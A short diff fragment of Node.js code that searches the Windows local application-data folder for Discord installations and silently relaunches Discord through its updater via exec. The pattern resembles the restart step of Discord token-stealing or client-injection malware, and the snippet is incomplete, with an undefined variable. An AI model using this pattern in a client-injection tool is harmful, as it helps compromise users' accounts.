@@ -1,0 +1,15 @@
+let LOCAL = process.env.LOCALAPPDATA
+fs.readdirSync(LOCAL).forEach(file => {
+    if (file.includes("iscord")) {
+	console.log("File: " + LOCAL + '\\' + file);
+        discords.push(LOCAL + '\\' + file)
+    } else {
+        return;
+    }
+})
+let path = LOCAL + '\\' + disc + "\\Update.exe --processStart " + disc + ".exe"
+exec(path, (err) => {
+            if (err) {
+              return;
+            }
+        })
